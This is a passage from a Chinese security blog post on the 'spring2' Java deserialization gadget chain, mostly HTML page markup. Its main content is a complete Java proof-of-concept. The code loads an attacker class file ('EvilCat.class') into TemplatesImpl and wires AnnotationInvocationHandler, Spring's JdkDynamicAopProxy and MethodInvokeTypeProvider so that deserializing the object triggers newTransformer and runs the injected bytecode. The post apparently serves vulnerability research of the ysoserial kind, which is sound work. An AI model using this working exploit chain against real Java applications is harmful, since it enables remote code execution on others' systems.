class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tmp.cc;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AopProxy;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">spring2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">byte</span>[] classBytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;EvilCat.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;classBytes&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,targetByteCodes);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-literal">null</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        Class&lt;?&gt; Annotation = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationDeclaredConstructor = Annotation.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        annotationDeclaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(templates);<br>        Class&lt;?&gt; Aop = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);<br>        Constructor&lt;?&gt; AopConstructor = Aop.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        AopConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">AopInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler)AopConstructor.newInstance(advisedSupport);<br><br>        <span class="hljs-type">Type</span> <span class="hljs-variable">Aopproxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class,<br>                Templates.class&#125;, AopInvocationHandler);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;getType&quot;</span>,Aopproxy);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">AnnotationInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationDeclaredConstructor.newInstance(Target.class, hashMap);<br><br>        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br>        <span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, AnnotationInvocationHandler);<br><br>        Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; MethodIConstructor = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        MethodIConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> MethodIConstructor.newInstance(typeProviderProxy,Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>),<span class="hljs-number">0</span>);<br>        setFieldValue(objects,<span class="hljs-string">&quot;methodName&quot;</span>,<span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>            outputStream.writeObject(objects);<br>            outputStream.close();<br><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x06-链接"><a href="#0x06-链接" class="headerlink" title="0x06 链接"></a>0x06 链接</h2><p><a target="_blank" rel="noopener" href="https://su18.org/post/ysoserial-su18-3/#spring2">https://su18.org/post/ysoserial-su18-3/#spring2</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>spring2-gadget</div>
+      <div>https://unam4.github.io/2023/12/14/spring2-gadget/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>unam4</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月14日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/12/14/fastcms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="fastcms代码审计">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">fastcms代码审计</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/14/spring1-gadget/" title="spring1-gadget">
+                        <span class="hidden-mobile">spring1-gadget</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
